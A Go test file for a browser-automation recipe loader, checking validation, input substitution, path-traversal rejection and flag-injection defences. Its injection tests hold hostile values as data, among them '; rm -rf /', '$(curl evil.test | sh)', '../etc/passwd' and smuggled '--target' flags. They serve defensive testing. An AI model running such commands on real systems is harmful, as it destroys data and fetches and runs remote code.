package recipe

import (
	"errors"
	"fmt"
	"os"
	"path/filepath"
	"reflect"
	"strings"
	"testing"
)

// write drops a recipe file into dir and returns its path. Fixtures are written
// into t.TempDir(), never into the repo.
func write(t *testing.T, dir, name, body string) string {
	t.Helper()
	if err := os.MkdirAll(dir, 0o755); err != nil {
		t.Fatalf("mkdir %s: %v", dir, err)
	}
	p := filepath.Join(dir, name+".yaml")
	if err := os.WriteFile(p, []byte(body), 0o644); err != nil {
		t.Fatalf("write %s: %v", p, err)
	}
	return p
}

// loadFixture writes a recipe and loads it, failing the test if it does not
// validate — for the cases where a valid recipe is the premise, not the point.
func loadFixture(t *testing.T, name, body string) *Recipe {
	t.Helper()
	r, err := Load(write(t, t.TempDir(), name, body), "project")
	if err != nil {
		t.Fatalf("Load(%s) = %v, want a valid recipe", name, err)
	}
	return r
}

const timesheet = `name: submit-timesheet
description: Fill and submit the weekly timesheet.
inputs:
  week:  { required: true,  description: "Monday of the week, YYYY-MM-DD" }
  hours: { default: "8",    description: "Hours per weekday" }
target: url:workday
steps:
  - label: open the timesheet
    run: ["nav", "https://workday.internal/time/{{week}}"]
  - run: ["wait", "--idle"]
  - label: fill weekdays
    run: ["fill", "#hours", "{{hours}}"]
  - label: save
    run: ["click", "--by", "name", "Save and Close", "--role", "button"]
    on_error: abort
`

// A recipe is a header plus argv arrays; loading preserves both exactly.
func TestLoadHeaderAndSteps(t *testing.T) {
	t.Parallel()
	r := loadFixture(t, "submit-timesheet", timesheet)

	if r.Name != "submit-timesheet" || r.Target != "url:workday" {
		t.Errorf("header = %q/%q, want submit-timesheet/url:workday", r.Name, r.Target)
	}
	if got := r.InputNames(); !reflect.DeepEqual(got, []string{"hours", "week"}) {
		t.Errorf("InputNames = %v, want [hours week]", got)
	}
	if !r.Inputs["week"].Required || r.Inputs["hours"].Default != "8" {
		t.Errorf("inputs = %+v, want week required and hours defaulting to 8", r.Inputs)
	}
	if len(r.Steps) != 4 {
		t.Fatalf("got %d steps, want 4", len(r.Steps))
	}
	if want := []string{"wait", "--idle"}; !reflect.DeepEqual(r.Steps[1].Run, want) {
		t.Errorf("step 2 run = %v, want %v", r.Steps[1].Run, want)
	}
	// on_error defaults to abort, so a step that says nothing still stops the run.
	if r.Steps[1].OnError != OnErrorAbort {
		t.Errorf("step 2 on_error = %q, want the %q default", r.Steps[1].OnError, OnErrorAbort)
	}
	if r.Steps[0].Label != "open the timesheet" {
		t.Errorf("step 1 label = %q", r.Steps[0].Label)
	}
}

// VS-2: substitution goes into an argv ELEMENT. The assertion is on the array,
// because "the rendered string looks right" is exactly the property that would
// still hold if this had been implemented with a shell.
func TestSubstitutionIntoArgvElement(t *testing.T) {
	t.Parallel()
	r := loadFixture(t, "fill", `name: fill
inputs:
  hours: { default: "0" }
steps:
  - run: ["fill", "#h", "{{hours}}"]
`)
	plan, err := Resolve(r, Opts{Set: map[string]string{"hours": "8"}})
	if err != nil {
		t.Fatalf("Resolve: %v", err)
	}
	want := []string{"fill", "#h", "8"}
	if !reflect.DeepEqual(plan.Steps[0].Argv, want) {
		t.Errorf("argv = %#v, want %#v", plan.Steps[0].Argv, want)
	}
}

// VS-3: a declared default is used when --set omits the input.
func TestDefaultApplies(t *testing.T) {
	t.Parallel()
	r := loadFixture(t, "fill", `name: fill
inputs:
  hours: { default: "8" }
steps:
  - run: ["fill", "#h", "{{hours}}"]
`)
	plan, err := Resolve(r, Opts{})
	if err != nil {
		t.Fatalf("Resolve: %v", err)
	}
	if got := plan.Steps[0].Argv[2]; got != "8" {
		t.Errorf("argv[2] = %q, want the default %q", got, "8")
	}
	if plan.Inputs["hours"] != "8" {
		t.Errorf("plan inputs = %v, want hours=8 recorded for the summary", plan.Inputs)
	}
}

// VS-4 (pure half): a missing required input is an error from Resolve, so the
// CLI never reaches a connection. The message must name the input — "missing
// input" without the name leaves the caller guessing which of five it was.
func TestMissingRequiredInput(t *testing.T) {
	t.Parallel()
	r := loadFixture(t, "timesheet", `name: timesheet
inputs:
  week: { required: true }
steps:
  - run: ["nav", "https://x.test/{{week}}"]
`)
	_, err := Resolve(r, Opts{})
	if err == nil {
		t.Fatal("Resolve with a missing required input = nil, want an error")
	}
	if !strings.Contains(err.Error(), "week") {
		t.Errorf("error %q does not name the missing input", err)
	}
}

// VS-6: an unknown --set key is rejected. Ignoring it would run the recipe with
// the default the user was trying to override — a silent wrong run.
func TestUnknownSetKeyRejected(t *testing.T) {
	t.Parallel()
	r := loadFixture(t, "fill", `name: fill
inputs:
  hours: { default: "8" }
steps:
  - run: ["fill", "#h", "{{hours}}"]
`)
	_, err := Resolve(r, Opts{Set: map[string]string{"typo": "1"}})
	if err == nil {
		t.Fatal("Resolve with an unknown --set key = nil, want an error")
	}
	if !strings.Contains(err.Error(), "typo") || !strings.Contains(err.Error(), "hours") {
		t.Errorf("error %q should name the unknown key and the declared inputs", err)
	}
}

// VS-5 and VS-12: everything a recipe can get wrong statically is caught by
// Load, before any input is resolved and long before a browser exists.
func TestMalformedRecipesRejectedAtLoad(t *testing.T) {
	t.Parallel()
	cases := map[string]struct {
		body string
		want string // substring the message must carry, so the author can fix it
	}{
		"invalid yaml": {
			body: "name: x\nsteps: [ unclosed\n",
			want: "did not find expected",
		},
		"run is a string not an array": {
			body: "name: x\nsteps:\n  - run: \"nav https://x.test\"\n",
			want: "must be an array",
		},
		"run contains a non-string": {
			body: "name: x\nsteps:\n  - run: [\"click\", \"--nth\", 2]\n",
			want: "must be a string",
		},
		"run is empty": {
			body: "name: x\nsteps:\n  - run: []\n",
			want: "empty",
		},
		"run is missing": {
			body: "name: x\nsteps:\n  - label: nothing to do\n",
			want: "`run` is required",
		},
		"unknown top-level key": {
			body: "name: x\nsteps:\n  - run: [\"snap\"]\nretries: 3\n",
			want: "retries",
		},
		"unknown step key": {
			body: "name: x\nsteps:\n  - run: [\"snap\"]\n    shell: rm -rf /\n",
			want: "shell",
		},
		"empty steps": {
			body: "name: x\nsteps: []\n",
			want: "at least one step",
		},
		"no steps key": {
			body: "name: x\ndescription: nothing\n",
			want: "at least one step",
		},
		"more than the step cap": {
			body: "name: x\nsteps:\n" + strings.Repeat("  - run: [\"snap\"]\n", MaxSteps+1),
			want: "step cap",
		},
		"a recipe invoking another recipe": {
			body: "name: x\nsteps:\n  - run: [\"recipe\", \"run\", \"other\"]\n",
			want: "recipes cannot invoke recipes",
		},
		"a step invoking session": {
			body: "name: x\nsteps:\n  - run: [\"session\"]\n",
			want: "stdin",
		},
		// The reserved-verb check reads argv[0]. Cobra does not: it strips
		// leading flags first, so a step that opens with one names a different
		// command than the validator saw. `--json recipe run x` recursed
		// forever; `--quiet session` ate the process's own stdin.
		"a leading flag hiding a recipe": {
			body: "name: x\nsteps:\n  - run: [\"--json\", \"recipe\", \"run\", \"other\"]\n",
			want: "must name its command first",
		},
		"a leading flag hiding session": {
			body: "name: x\nsteps:\n  - run: [\"--quiet\", \"session\"]\n",
			want: "must name its command first",
		},
		"a leading -- terminator": {
			body: "name: x\nsteps:\n  - run: [\"--\", \"snap\"]\n",
			want: "must name its command first",
		},
		"a placeholder as the command name": {
			body: "name: x\ninputs:\n  cmd: { default: \"snap\" }\nsteps:\n  - run: [\"{{cmd}}\"]\n",
			want: "must be a literal",
		},
		"undeclared placeholder": { // VS-5
			body: "name: x\nsteps:\n  - run: [\"nav\", \"https://x.test/{{nope}}\"]\n",
			want: "not a declared input",
		},
		"malformed placeholder": { // not even shaped like an input name
			body: "name: x\nsteps:\n  - run: [\"nav\", \"{{week.start}}\"]\n",
			want: "malformed placeholder",
		},
		"empty placeholder": {
			body: "name: x\nsteps:\n  - run: [\"nav\", \"{{}}\"]\n",
			want: "empty placeholder",
		},
		"unknown on_error": {
			body: "name: x\nsteps:\n  - run: [\"snap\"]\n    on_error: retry\n",
			want: "on_error",
		},
		"name disagrees with the filename": {
			body: "name: other\nsteps:\n  - run: [\"snap\"]\n",
			want: "does not match the filename",
		},
		"no name": {
			body: "steps:\n  - run: [\"snap\"]\n",
			want: "`name` is required",
		},
		"required input with a default": {
			body: "name: x\ninputs:\n  a: { required: true, default: \"1\" }\nsteps:\n  - run: [\"snap\"]\n",
			want: "pick one",
		},
		"empty file": {
			body: "",
			want: "empty",
		},
	}
	for name, c := range cases {
		t.Run(name, func(t *testing.T) {
			t.Parallel()
			_, err := Load(write(t, t.TempDir(), "x", c.body), "project")
			if err == nil {
				t.Fatalf("Load(%s) = nil, want a validation error", name)
			}
			if !strings.Contains(err.Error(), c.want) {
				t.Errorf("error %q does not contain %q", err, c.want)
			}
		})
	}
}

// VS-11: the same name in the project dir and the user config dir resolves to
// the project one — the property that makes a repo-committed recipe beat a
// teammate's personal copy — and List marks where each entry came from.
func TestResolutionPrecedence(t *testing.T) {
	t.Parallel()
	root := t.TempDir()
	project := filepath.Join(root, "proj", ".chrome-cdp", "recipes")
	user := filepath.Join(root, "config", "chrome-cdp", "recipes")
	extra := filepath.Join(root, "extra")

	write(t, project, "shared", "name: shared\ndescription: from the project\nsteps:\n  - run: [\"snap\"]\n")
	write(t, user, "shared", "name: shared\ndescription: from the user config\nsteps:\n  - run: [\"snap\"]\n")
	write(t, user, "personal", "name: personal\ndescription: only in the user config\nsteps:\n  - run: [\"snap\"]\n")
	write(t, extra, "handed-over", "name: handed-over\ndescription: from --dir\nsteps:\n  - run: [\"snap\"]\n")

	dirs := SearchPath(filepath.Join(root, "proj"), filepath.Join(root, "config", "chrome-cdp"), extra)

	path, source, err := Find("shared", dirs)
	if err != nil {
		t.Fatalf("Find(shared): %v", err)
	}
	if source != "project" || !strings.HasPrefix(path, project) {
		t.Errorf("Find(shared) = %s (%s), want the project copy", path, source)
	}

	got := map[string]string{}
	for _, e := range List(dirs) {
		if e.Err != nil {
			t.Fatalf("List entry %s: %v", e.Name, e.Err)
		}
		got[e.Name] = e.Source
	}
	want := map[string]string{"shared": "project", "personal": "user", "handed-over": "--dir"}
	if !reflect.DeepEqual(got, want) {
		t.Errorf("List sources = %v, want %v", got, want)
	}
}

// A missing search directory is the normal case (most users have no project
// dir), not an error that should hide the directories that do exist.
func TestListSkipsMissingDirs(t *testing.T) {
	t.Parallel()
	root := t.TempDir()
	user := filepath.Join(root, "chrome-cdp", "recipes")
	write(t, user, "only", "name: only\nsteps:\n  - run: [\"snap\"]\n")

	entries := List(SearchPath(filepath.Join(root, "nowhere"), filepath.Join(root, "chrome-cdp"), ""))
	if len(entries) != 1 || entries[0].Name != "only" {
		t.Errorf("List = %+v, want just the one recipe that exists", entries)
	}
}

// One unreadable recipe must not hide the readable ones: List reports the error
// in place so `recipe list` still shows the rest.
func TestListReportsBrokenRecipeInPlace(t *testing.T) {
	t.Parallel()
	dir := filepath.Join(t.TempDir(), "recipes")
	write(t, dir, "good", "name: good\nsteps:\n  - run: [\"snap\"]\n")
	write(t, dir, "broken", "name: broken\nsteps: nope\n")

	entries := List([]Dir{{Path: dir, Source: "--dir"}})
	if len(entries) != 2 {
		t.Fatalf("got %d entries, want 2", len(entries))
	}
	if entries[0].Name != "broken" || entries[0].Err == nil {
		t.Errorf("entry 0 = %+v, want the broken recipe carrying its error", entries[0])
	}
	if entries[1].Name != "good" || entries[1].Err != nil {
		t.Errorf("entry 1 = %+v, want the good recipe loaded", entries[1])
	}
}

func TestFindReportsNotFound(t *testing.T) {
	t.Parallel()
	_, _, err := Find("absent", SearchPath(t.TempDir(), "", ""))
	if !errors.Is(err, ErrNotFound) {
		t.Fatalf("Find(absent) error = %v, want ErrNotFound", err)
	}
}

// A recipe name becomes a path element, so anything that could escape the
// search directories is refused before filepath.Join ever sees it.
func TestFindRejectsTraversal(t *testing.T) {
	t.Parallel()
	dirs := SearchPath(t.TempDir(), "", "")
	for _, name := range []string{"../etc/passwd", "a/b", "..", "", ".hidden", "a b"} {
		if _, _, err := Find(name, dirs); err == nil {
			t.Errorf("Find(%q) = nil error, want a rejected name", name)
		}
	}
}

// Find accepts either extension, because both are ordinary YAML spellings and
// refusing one is a pointless papercut.
func TestFindAcceptsYmlExtension(t *testing.T) {
	t.Parallel()
	dir := t.TempDir()
	p := filepath.Join(dir, "short.yml")
	if err := os.WriteFile(p, []byte("name: short\nsteps:\n  - run: [\"snap\"]\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	got, _, err := Find("short", []Dir{{Path: dir, Source: "--dir"}})
	if err != nil || got != p {
		t.Errorf("Find(short) = %q, %v; want %q", got, err, p)
	}
}

// VS-13: --from-step runs a suffix of the recipe, and the surviving steps keep
// their original indexes so a summary points at the step the author wrote.
func TestFromStep(t *testing.T) {
	t.Parallel()
	r := loadFixture(t, "four", `name: four
steps:
  - run: ["snap"]
  - run: ["text", "h1"]
  - run: ["click", "#go"]
  - run: ["wait", "--idle"]
`)
	plan, err := Resolve(r, Opts{FromStep: 3})
	if err != nil {
		t.Fatalf("Resolve: %v", err)
	}
	if len(plan.Steps) != 2 {
		t.Fatalf("got %d steps, want 2", len(plan.Steps))
	}
	if plan.Steps[0].Index != 3 || plan.Steps[1].Index != 4 {
		t.Errorf("indexes = %d,%d; want 3,4 (positions in the file, not the run)", plan.Steps[0].Index, plan.Steps[1].Index)
	}
	if plan.FromStep != 3 {
		t.Errorf("plan.FromStep = %d, want 3", plan.FromStep)
	}
}

func TestFromStepOutOfRange(t *testing.T) {
	t.Parallel()
	r := loadFixture(t, "two", "name: two\nsteps:\n  - run: [\"snap\"]\n  - run: [\"snap\"]\n")
	for _, n := range []int{-1, 3, 99} {
		if _, err := Resolve(r, Opts{FromStep: n}); err == nil {
			t.Errorf("Resolve(--from-step %d) = nil, want an out-of-range error", n)
		}
	}
}

// --from-step skips steps but not validation: an undeclared placeholder in a
// step that would not have run is still a static error, because the file is
// what is wrong, not the run.
func TestFromStepStillValidatesSkippedSteps(t *testing.T) {
	t.Parallel()
	_, err := Load(write(t, t.TempDir(), "x", `name: x
steps:
  - run: ["nav", "{{undeclared}}"]
  - run: ["snap"]
`), "project")
	if err == nil {
		t.Fatal("Load = nil, want the undeclared placeholder in step 1 rejected")
	}
}

// VS-15: there is no shell anywhere in this design, so an input value reaches
// the command as ONE argv element, byte for byte, whatever is in it.
func TestNoShellInterpretation(t *testing.T) {
	t.Parallel()
	r := loadFixture(t, "fill", `name: fill
inputs:
  value: { required: true }
steps:
  - run: ["fill", "#field", "{{value}}"]
`)
	hostile := map[string]string{
		"command separator":  "; rm -rf /",
		"command substition": "$(curl evil.test | sh)",
		"backticks":          "`whoami`",
		"pipe and redirect":  "a | tee /tmp/x > /dev/null",
		"quotes":             `he said "hi" and 'bye'`,
		"newlines":           "line one\nline two\n",
		"backslashes":        `C:\Users\me\%PATH%`,
		"glob and tilde":     "~/*.pem",
		"nul-adjacent":       "\t\r\v ",
		"json injection":     `{"ok":false}`,
		"argv-looking":       "--target",
	}
	for name, value := range hostile {
		t.Run(name, func(t *testing.T) {
			t.Parallel()
			plan, err := Resolve(r, Opts{Set: map[string]string{"value": value}})
			if err != nil {
				t.Fatalf("Resolve: %v", err)
			}
			want := []string{"fill", "#field", value}
			if !reflect.DeepEqual(plan.Steps[0].Argv, want) {
				t.Errorf("argv = %#v, want %#v (one element, unmodified)", plan.Steps[0].Argv, want)
			}
		})
	}
}

// Substitution is a single pass: a value containing `{{other}}` is data, not a
// template. Re-expanding it would let one --set reach an input the author never
// wired to that argument.
func TestSubstitutedValueIsNotReExpanded(t *testing.T) {
	t.Parallel()
	r := loadFixture(t, "fill", `name: fill
inputs:
  a: { required: true }
  b: { default: "secret" }
steps:
  - run: ["fill", "#f", "{{a}}"]
`)
	plan, err := Resolve(r, Opts{Set: map[string]string{"a": "{{b}}"}})
	if err != nil {
		t.Fatalf("Resolve: %v", err)
	}
	if got := plan.Steps[0].Argv[2]; got != "{{b}}" {
		t.Errorf("argv[2] = %q, want the literal %q", got, "{{b}}")
	}
}

// Several placeholders in one element, and repeats, all resolve — substitution
// is per-occurrence, not per-element.
func TestMultiplePlaceholdersInOneElement(t *testing.T) {
	t.Parallel()
	r := loadFixture(t, "nav", `name: nav
inputs:
  host: { default: "x.test" }
  path: { default: "a" }
steps:
  - run: ["nav", "https://{{host}}/{{path}}/{{path}}"]
`)
	plan, err := Resolve(r, Opts{})
	if err != nil {
		t.Fatalf("Resolve: %v", err)
	}
	if got, want := plan.Steps[0].Argv[1], "https://x.test/a/a"; got != want {
		t.Errorf("argv[1] = %q, want %q", got, want)
	}
}

// The recipe's `target:` is injected into each step's argv rather than applied
// out of band, so the dry-run listing is the whole truth about what runs.
func TestTargetInjectedIntoArgv(t *testing.T) {
	t.Parallel()
	r := loadFixture(t, "t", `name: t
target: url:workday
steps:
  - run: ["snap"]
  - run: ["snap", "--target", "@2"]
`)
	plan, err := Resolve(r, Opts{})
	if err != nil {
		t.Fatalf("Resolve: %v", err)
	}
	if want := []string{"snap", "--target", "url:workday"}; !reflect.DeepEqual(plan.Steps[0].Argv, want) {
		t.Errorf("step 1 argv = %#v, want %#v", plan.Steps[0].Argv, want)
	}
	// A step that names its own target keeps it: the header is a default, not
	// an override.
	if want := []string{"snap", "--target", "@2"}; !reflect.DeepEqual(plan.Steps[1].Argv, want) {
		t.Errorf("step 2 argv = %#v, want %#v", plan.Steps[1].Argv, want)
	}
}

// valueFlags stands in for the command tree in the pure tests: the flags a step
// may write that consume the following argv element.
var valueFlags = map[string]bool{"--by": true, "--role": true, "--target": true}

// testSplit is a Splitter over the argv AS WRITTEN, with the same shape the CLI
// builds from cobra's own flag definitions.
func testSplit(argv []string) (flagIdx, posIdx []int, ok bool) {
	if len(argv) == 0 || strings.HasPrefix(argv[0], "-") {
		return nil, nil, false
	}
	flagIdx = append(flagIdx, 0) // the verb
	for i := 1; i < len(argv); i++ {
		switch {
		case argv[i] == "--":
			for j := i + 1; j < len(argv); j++ {
				posIdx = append(posIdx, j)
			}
			return flagIdx, posIdx, true
		case strings.HasPrefix(argv[i], "-"):
			flagIdx = append(flagIdx, i)
			if valueFlags[argv[i]] && i+1 < len(argv) {
				i++
				flagIdx = append(flagIdx, i)
			}
		default:
			posIdx = append(posIdx, i)
		}
	}
	return flagIdx, posIdx, true
}

// A step's data is emitted after a `--` terminator, so a substituted value can
// never reach flag position.
//
// RFC-0009 promises an input substitutes into ONE argv element and never into a
// command line. That held for word splitting and not for flag parsing: cobra
// parses flags at any position, so `--set sel=--target=@2` substituted into a
// step's positional used to arrive as a second --target.
func TestSubstitutedValueNeverReachesFlagPosition(t *testing.T) {
	t.Parallel()
	r := loadFixture(t, "t", `name: t
target: url:payroll.corp
inputs:
  sel: { required: true }
steps:
  - run: ["text", "{{sel}}"]
  - run: ["click", "--by", "name", "{{sel}}", "--role", "button"]
`)
	for _, hostile := range []string{"--target=@2", "--target", "--policy-off", "--no-daemon", "-v", "-q"} {
		plan, err := Resolve(r, Opts{Set: map[string]string{"sel": hostile}, Split: testSplit})
		if err != nil {
			t.Fatalf("Resolve(%q): %v", hostile, err)
		}
		want := []string{"text", "--target", "url:payroll.corp", "--", hostile}
		if !reflect.DeepEqual(plan.Steps[0].Argv, want) {
			t.Errorf("--set sel=%s\n  step 1 argv = %#v\n  want          %#v", hostile, plan.Steps[0].Argv, want)
		}
		want = []string{"click", "--by", "name", "--role", "button", "--target", "url:payroll.corp", "--", hostile}
		if !reflect.DeepEqual(plan.Steps[1].Argv, want) {
			t.Errorf("--set sel=%s\n  step 2 argv = %#v\n  want          %#v", hostile, plan.Steps[1].Argv, want)
		}
	}
}

// The recipe's pinned target is decided from the argv AS WRITTEN. Deciding it
// from the substituted argv let a --set value equal to `--target` suppress the
// header's target, so the step read a different tab than the recipe pinned.
func TestSubstitutedValueCannotSuppressThePinnedTarget(t *testing.T) {
	t.Parallel()
	r := loadFixture(t, "t", `name: t
target: url:payroll.corp
inputs:
  sel: { required: true }
steps:
  - run: ["text", "{{sel}}"]
`)
	for _, hostile := range []string{"--target=@2", "--target"} {
		for name, split := range map[string]Splitter{"with a splitter": testSplit, "without one": nil} {
			plan, err := Resolve(r, Opts{Set: map[string]string{"sel": hostile}, Split: split})
			if err != nil {
				t.Fatalf("Resolve(%q) %s: %v", hostile, name, err)
			}
			argv := plan.Steps[0].Argv
			pinned := false
			for i := 0; i+1 < len(argv); i++ {
				if argv[i] == "--target" && argv[i+1] == "url:payroll.corp" {
					pinned = true
				}
			}
			if !pinned {
				t.Errorf("--set sel=%s %s: argv = %#v, want the recipe's pinned target still injected", hostile, name, argv)
			}
		}
	}
}

// A step that writes its own `--` gets exactly one terminator, in the one place
// it belongs — otherwise the injected `--target X` lands after it and is read
// as two positionals.
func TestStepWithItsOwnTerminator(t *testing.T) {
	t.Parallel()
	r := loadFixture(t, "t", "name: t\ntarget: aa11\nsteps:\n  - run: [\"text\", \"--\", \"-weird-selector\"]\n")
	plan, err := Resolve(r, Opts{Split: testSplit})
	if err != nil {
		t.Fatalf("Resolve: %v", err)
	}
	want := []string{"text", "--target", "aa11", "--", "-weird-selector"}
	if !reflect.DeepEqual(plan.Steps[0].Argv, want) {
		t.Errorf("argv = %#v, want %#v", plan.Steps[0].Argv, want)
	}
}

func TestRunTargetOverridesHeader(t *testing.T) {
	t.Parallel()
	r := loadFixture(t, "t", "name: t\ntarget: url:workday\nsteps:\n  - run: [\"snap\"]\n")
	plan, err := Resolve(r, Opts{Target: "url:staging"})
	if err != nil {
		t.Fatalf("Resolve: %v", err)
	}
	if want := []string{"snap", "--target", "url:staging"}; !reflect.DeepEqual(plan.Steps[0].Argv, want) {
		t.Errorf("argv = %#v, want %#v", plan.Steps[0].Argv, want)
	}
}

// A recipe with no target and no --target injects nothing: the steps run
// against the sticky tab, exactly as the same argv would on the command line.
func TestNoTargetInjectsNothing(t *testing.T) {
	t.Parallel()
	r := loadFixture(t, "t", "name: t\nsteps:\n  - run: [\"snap\"]\n")
	plan, err := Resolve(r, Opts{})
	if err != nil {
		t.Fatalf("Resolve: %v", err)
	}
	if want := []string{"snap"}; !reflect.DeepEqual(plan.Steps[0].Argv, want) {
		t.Errorf("argv = %#v, want %#v", plan.Steps[0].Argv, want)
	}
}

// The step cap is a bound, not a suggestion: exactly MaxSteps must still load,
// so the error above it is a cap and not an off-by-one.
func TestStepCapBoundary(t *testing.T) {
	t.Parallel()
	body := "name: big\nsteps:\n" + strings.Repeat("  - run: [\"snap\"]\n", MaxSteps)
	r, err := Load(write(t, t.TempDir(), "big", body), "project")
	if err != nil {
		t.Fatalf("Load with exactly %d steps = %v, want it accepted", MaxSteps, err)
	}
	if len(r.Steps) != MaxSteps {
		t.Errorf("got %d steps, want %d", len(r.Steps), MaxSteps)
	}
}

// VS-14 (pure half): the scaffold `recipe new` writes must load, validate, and
// resolve. A template the validator rejects is the worst possible introduction
// to the format, and only a test keeps the two in step.
func TestTemplateLoadsAndValidates(t *testing.T) {
	t.Parallel()
	dir := t.TempDir()
	r, err := Load(write(t, dir, "demo", Template("demo")), "project")
	if err != nil {
		t.Fatalf("the recipe new template does not validate: %v", err)
	}
	if r.Name != "demo" {
		t.Errorf("template name = %q, want demo", r.Name)
	}
	plan, err := Resolve(r, Opts{})
	if err != nil {
		t.Fatalf("the template does not resolve with its own defaults: %v", err)
	}
	if len(plan.Steps) == 0 {
		t.Error("the template resolved to no steps; a scaffold should run as-is")
	}
}

// Two YAML documents in one file are two recipes; running the first silently
// would be a surprising way to lose the second.
func TestMultiDocumentRejected(t *testing.T) {
	t.Parallel()
	_, err := Load(write(t, t.TempDir(), "x", "name: x\nsteps:\n  - run: [\"snap\"]\n---\nname: y\n"), "project")
	if err == nil || !strings.Contains(err.Error(), "single document") {
		t.Fatalf("Load = %v, want a single-document error", err)
	}
}

// Every rejection names the file it came from; a message that does not is
// unusable when `recipe list` walks three directories.
func TestErrorsNameTheFile(t *testing.T) {
	t.Parallel()
	path := write(t, t.TempDir(), "x", "name: x\nsteps: []\n")
	_, err := Load(path, "project")
	if err == nil || !strings.Contains(err.Error(), path) {
		t.Fatalf("error %v does not name %s", err, path)
	}
}

func TestLoadMissingFile(t *testing.T) {
	t.Parallel()
	if _, err := Load(filepath.Join(t.TempDir(), "nope.yaml"), "project"); err == nil {
		t.Fatal("Load of a missing file = nil, want an error")
	}
}

// SearchPath drops empty roots rather than producing "/recipes" or "recipes",
// either of which would silently point somewhere real.
func TestSearchPathSkipsEmptyRoots(t *testing.T) {
	t.Parallel()
	if got := SearchPath("", "", ""); len(got) != 0 {
		t.Errorf("SearchPath with no roots = %v, want empty", got)
	}
	got := SearchPath("/proj", "", "/extra")
	want := []Dir{
		{Path: filepath.Join("/proj", ".chrome-cdp", "recipes"), Source: "project"},
		{Path: "/extra", Source: "--dir"},
	}
	if !reflect.DeepEqual(got, want) {
		t.Errorf("SearchPath = %v, want %v", got, want)
	}
}

// An input declared but never referenced is not an error — recipes get edited,
// and a stale input is a cleanliness problem, not a correctness one.
func TestUnusedInputIsAllowed(t *testing.T) {
	t.Parallel()
	r := loadFixture(t, "x", "name: x\ninputs:\n  unused: { default: \"1\" }\nsteps:\n  - run: [\"snap\"]\n")
	if _, err := Resolve(r, Opts{Set: map[string]string{"unused": "2"}}); err != nil {
		t.Errorf("Resolve = %v, want an unused input tolerated", err)
	}
}

// Whitespace inside the braces is forgiving; the name is what matters.
func TestPlaceholderTolerantOfInnerSpaces(t *testing.T) {
	t.Parallel()
	r := loadFixture(t, "x", "name: x\ninputs:\n  a: { default: \"v\" }\nsteps:\n  - run: [\"text\", \"{{ a }}\"]\n")
	plan, err := Resolve(r, Opts{})
	if err != nil {
		t.Fatalf("Resolve: %v", err)
	}
	if got := plan.Steps[0].Argv[1]; got != "v" {
		t.Errorf("argv[1] = %q, want %q", got, "v")
	}
}

// A defaulted input that is not supplied resolves to the empty string rather
// than leaving the placeholder text in the argv, which would send `{{x}}` to
// the browser as a literal selector.
func TestUndefaultedOptionalInputResolvesEmpty(t *testing.T) {
	t.Parallel()
	r := loadFixture(t, "x", "name: x\ninputs:\n  a: {}\nsteps:\n  - run: [\"text\", \"h1{{a}}\"]\n")
	plan, err := Resolve(r, Opts{})
	if err != nil {
		t.Fatalf("Resolve: %v", err)
	}
	if got := plan.Steps[0].Argv[1]; got != "h1" {
		t.Errorf("argv[1] = %q, want %q", got, "h1")
	}
}

func TestValidName(t *testing.T) {
	t.Parallel()
	ok := []string{"a", "submit-timesheet", "x_1", "A9"}
	bad := []string{"", "-lead", "_lead", "with space", "with/slash", "..", "dot.name"}
	for _, n := range ok {
		if err := ValidName(n); err != nil {
			t.Errorf("ValidName(%q) = %v, want nil", n, err)
		}
	}
	for _, n := range bad {
		if err := ValidName(n); err == nil {
			t.Errorf("ValidName(%q) = nil, want an error", n)
		}
	}
}

// Resolve must not mutate the loaded recipe: `recipe list` loads once and the
// same *Recipe could be resolved twice with different inputs.
func TestResolveDoesNotMutateRecipe(t *testing.T) {
	t.Parallel()
	r := loadFixture(t, "x", "name: x\ninputs:\n  a: { default: \"1\" }\ntarget: url:t\nsteps:\n  - run: [\"text\", \"{{a}}\"]\n")
	before := fmt.Sprintf("%v", r.Steps)
	if _, err := Resolve(r, Opts{Set: map[string]string{"a": "2"}}); err != nil {
		t.Fatal(err)
	}
	if after := fmt.Sprintf("%v", r.Steps); after != before {
		t.Errorf("Resolve mutated the recipe: %s -> %s", before, after)
	}
}
